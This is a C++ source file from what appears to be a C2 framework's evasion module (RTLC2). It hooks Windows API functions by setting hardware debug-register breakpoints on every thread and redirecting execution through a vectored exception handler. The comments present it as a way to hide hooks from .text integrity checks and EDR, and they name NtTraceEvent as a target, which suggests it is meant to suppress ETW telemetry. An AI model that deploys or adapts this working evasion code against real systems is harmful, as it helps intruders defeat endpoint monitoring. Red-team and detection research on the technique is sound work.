/*
 * hw_bp_hook.cpp - Hardware Breakpoint-Based API Hooking
 *
 * Uses x86/x64 Debug Registers (DR0-DR3) to set execution breakpoints
 * on API functions. When the CPU hits a breakpoint, a Vectored Exception
 * Handler intercepts EXCEPTION_SINGLE_STEP and redirects execution to
 * our detour function. This avoids writing to code pages entirely,
 * making the hooks invisible to integrity checks on .text sections.
 *
 * Limitations:
 *   - Maximum 4 concurrent hooks (hardware limit: DR0-DR3)
 *   - Breakpoints are per-thread; must be set on each thread individually
 *   - Some EDR products monitor debug register manipulation
 *
 * Part of RTLC2 Phase 4: Advanced Evasion Techniques
 */

#include "evasion.h"

#ifdef RTLC2_WINDOWS
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <mutex>
#include <cstdint>

namespace rtlc2 {
namespace evasion {

// ============================================================================
// Constants and Structures
// ============================================================================

// Maximum hardware breakpoints supported by x86/x64 architecture
static constexpr int MAX_HW_BP = 4;

// DR7 control register bit layout:
//   Bits 0,2,4,6    = Local enable for DR0-DR3
//   Bits 1,3,5,7    = Global enable for DR0-DR3
//   Bits 16-17      = Condition for DR0 (00=exec, 01=write, 10=io, 11=rw)
//   Bits 18-19      = Length for DR0 (00=1byte, 01=2byte, 10=8byte/undef, 11=4byte)
//   Bits 20-23      = Condition/Length for DR1
//   Bits 24-27      = Condition/Length for DR2
//   Bits 28-31      = Condition/Length for DR3

static constexpr DWORD64 DR7_LOCAL_ENABLE_SHIFT  = 0;   // DR0 local enable at bit 0
static constexpr DWORD64 DR7_CONDLEN_SHIFT       = 16;  // DR0 cond/len at bit 16
static constexpr DWORD64 DR7_CONDLEN_MASK        = 0xFULL;
static constexpr DWORD64 DR7_COND_EXEC           = 0x0ULL; // Execute breakpoint
static constexpr DWORD64 DR7_LEN_1BYTE           = 0x0ULL; // 1-byte length

// Describes a single hardware breakpoint hook
struct HWBPHook {
    void*   targetAddr;     // Original function address being hooked
    void*   detourFunc;     // Our replacement/detour function
    int     drIndex;        // Debug register index (0-3)
    bool    active;         // Whether this hook is currently active
};

// ============================================================================
// Global State
// ============================================================================

static HWBPHook     g_hooks[MAX_HW_BP]  = {};
static std::mutex   g_hookMutex;
static bool         g_handlerInstalled   = false;
static PVOID        g_vehHandle          = nullptr;

// ============================================================================
// Vectored Exception Handler
// ============================================================================

// This handler is called when any exception occurs. We only care about
// EXCEPTION_SINGLE_STEP, which is raised when the CPU hits a debug
// register breakpoint.
static LONG WINAPI HWBPExceptionHandler(PEXCEPTION_POINTERS pExcInfo) {
    // Only handle single-step exceptions (debug breakpoints)
    if (pExcInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Get the instruction pointer that triggered the breakpoint
    DWORD64 faultAddr = 0;
#ifdef _WIN64
    faultAddr = pExcInfo->ContextRecord->Rip;
#else
    faultAddr = (DWORD64)pExcInfo->ContextRecord->Eip;
#endif

    // Check if the fault address matches any of our hooks
    std::lock_guard<std::mutex> lock(g_hookMutex);
    for (int i = 0; i < MAX_HW_BP; i++) {
        if (!g_hooks[i].active) continue;
        if ((DWORD64)g_hooks[i].targetAddr != faultAddr) continue;

        // Match found: redirect execution to our detour function
#ifdef _WIN64
        pExcInfo->ContextRecord->Rip = (DWORD64)g_hooks[i].detourFunc;
#else
        pExcInfo->ContextRecord->Eip = (DWORD)g_hooks[i].detourFunc;
#endif

        // Clear DR6 status register to acknowledge the breakpoint
        // and prevent re-triggering on resume
        pExcInfo->ContextRecord->Dr6 = 0;

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // Not one of our breakpoints; let other handlers deal with it
    return EXCEPTION_CONTINUE_SEARCH;
}

// ============================================================================
// Internal Helpers
// ============================================================================

// Apply debug register settings to a specific thread context.
// Sets or clears the specified DR register and updates DR7 accordingly.
static bool ApplyDRToContext(CONTEXT* ctx, int drIndex, void* addr, bool enable) {
    if (!ctx || drIndex < 0 || drIndex >= MAX_HW_BP) return false;

    // Set the debug address register (DR0-DR3)
    DWORD64 addrVal = enable ? (DWORD64)addr : 0;
    switch (drIndex) {
        case 0: ctx->Dr0 = addrVal; break;
        case 1: ctx->Dr1 = addrVal; break;
        case 2: ctx->Dr2 = addrVal; break;
        case 3: ctx->Dr3 = addrVal; break;
        default: return false;
    }

    // Compute the local enable bit for this DR index
    // DR7 bits: 0=L0, 2=L1, 4=L2, 6=L3
    DWORD64 localEnableBit = 1ULL << (drIndex * 2);

    // Compute the condition/length bits position for this DR index
    // DR7 bits: 16-19=DR0, 20-23=DR1, 24-27=DR2, 28-31=DR3
    int condLenShift = (int)(DR7_CONDLEN_SHIFT + drIndex * 4);
    DWORD64 condLenClearMask = DR7_CONDLEN_MASK << condLenShift;

    if (enable) {
        // Enable: set local enable bit and condition=exec, length=1byte
        ctx->Dr7 |= localEnableBit;
        ctx->Dr7 &= ~condLenClearMask;  // Clear existing condition/length
        DWORD64 condLen = (DR7_COND_EXEC | (DR7_LEN_1BYTE << 2)) << condLenShift;
        ctx->Dr7 |= condLen;
    } else {
        // Disable: clear local enable bit and condition/length
        ctx->Dr7 &= ~localEnableBit;
        ctx->Dr7 &= ~condLenClearMask;
    }

    return true;
}

// Apply a breakpoint to a single thread identified by its thread ID.
static bool SetBreakpointOnThread(DWORD threadId, int drIndex, void* addr, bool enable) {
    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                                THREAD_SUSPEND_RESUME, FALSE, threadId);
    if (!hThread || hThread == INVALID_HANDLE_VALUE) return false;

    bool result = false;

    // Suspend the thread to safely modify its context
    if (SuspendThread(hThread) != (DWORD)-1) {
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

        if (GetThreadContext(hThread, &ctx)) {
            if (ApplyDRToContext(&ctx, drIndex, addr, enable)) {
                result = (SetThreadContext(hThread, &ctx) != 0);
            }
        }
        ResumeThread(hThread);
    }

    CloseHandle(hThread);
    return result;
}

// Enumerate all threads in the current process and apply the breakpoint
// to each one. Returns the number of threads successfully modified.
static int SetBreakpointOnAllThreads(int drIndex, void* addr, bool enable) {
    DWORD currentPid = GetCurrentProcessId();
    DWORD currentTid = GetCurrentThreadId();
    int successCount = 0;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te = {};
    te.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID != currentPid) continue;

            if (te.th32ThreadID == currentTid) {
                // For the current thread, we can use GetCurrentThread()
                // which is a pseudo-handle that doesn't need opening
                CONTEXT ctx = {};
                ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                HANDLE hCurrent = GetCurrentThread();
                if (GetThreadContext(hCurrent, &ctx)) {
                    if (ApplyDRToContext(&ctx, drIndex, addr, enable)) {
                        if (SetThreadContext(hCurrent, &ctx)) {
                            successCount++;
                        }
                    }
                }
            } else {
                if (SetBreakpointOnThread(te.th32ThreadID, drIndex, addr, enable)) {
                    successCount++;
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return successCount;
}

// ============================================================================
// Public API
// ============================================================================

// Install the Vectored Exception Handler if not already installed.
// Called automatically by SetHWBreakpoint, but can be called explicitly
// for early initialization.
bool InitHWBPHooks() {
    std::lock_guard<std::mutex> lock(g_hookMutex);
    if (!g_handlerInstalled) {
        // Priority 1 = first handler (called before other VEH handlers)
        g_vehHandle = AddVectoredExceptionHandler(1, HWBPExceptionHandler);
        if (!g_vehHandle) return false;
        g_handlerInstalled = true;
    }
    return true;
}

// Set a hardware breakpoint on a function address. When the function
// is called, execution will be redirected to detourFunc.
//
// Parameters:
//   targetAddr - Address of the function to hook (e.g., NtTraceEvent)
//   detourFunc - Address of our replacement function
//   drIndex    - Debug register to use (0-3)
//
// Returns true if the breakpoint was successfully set on at least one thread.
bool SetHWBreakpoint(void* targetAddr, void* detourFunc, int drIndex) {
    if (!targetAddr || !detourFunc) return false;
    if (drIndex < 0 || drIndex >= MAX_HW_BP) return false;

    // Ensure the VEH is installed
    if (!InitHWBPHooks()) return false;

    // Register the hook in our tracking table
    {
        std::lock_guard<std::mutex> lock(g_hookMutex);
        if (g_hooks[drIndex].active) {
            // DR slot already in use; caller should remove it first
            return false;
        }
        g_hooks[drIndex].targetAddr = targetAddr;
        g_hooks[drIndex].detourFunc = detourFunc;
        g_hooks[drIndex].drIndex    = drIndex;
        g_hooks[drIndex].active     = true;
    }

    // Apply the breakpoint to all threads in the process
    int count = SetBreakpointOnAllThreads(drIndex, targetAddr, true);
    if (count == 0) {
        // Failed on all threads; roll back
        std::lock_guard<std::mutex> lock(g_hookMutex);
        g_hooks[drIndex].active = false;
        return false;
    }

    return true;
}

// Remove a hardware breakpoint from all threads.
//
// Parameters:
//   drIndex - Debug register index (0-3) of the hook to remove
//
// Returns true if the breakpoint was successfully removed.
bool RemoveHWBreakpoint(int drIndex) {
    if (drIndex < 0 || drIndex >= MAX_HW_BP) return false;

    {
        std::lock_guard<std::mutex> lock(g_hookMutex);
        if (!g_hooks[drIndex].active) return true; // Already removed
        g_hooks[drIndex].active = false;
    }

    // Clear the debug register on all threads
    SetBreakpointOnAllThreads(drIndex, nullptr, false);

    return true;
}

// Remove all active hardware breakpoint hooks and optionally
// uninstall the VEH handler.
void CleanupHWBPHooks() {
    for (int i = 0; i < MAX_HW_BP; i++) {
        RemoveHWBreakpoint(i);
    }

    std::lock_guard<std::mutex> lock(g_hookMutex);
    if (g_handlerInstalled && g_vehHandle) {
        RemoveVectoredExceptionHandler(g_vehHandle);
        g_vehHandle = nullptr;
        g_handlerInstalled = false;
    }
}

// Find the next available debug register slot.
// Returns -1 if all 4 slots are in use.
int FindFreeDRSlot() {
    std::lock_guard<std::mutex> lock(g_hookMutex);
    for (int i = 0; i < MAX_HW_BP; i++) {
        if (!g_hooks[i].active) return i;
    }
    return -1;
}

} // namespace evasion
} // namespace rtlc2

#endif // RTLC2_WINDOWS
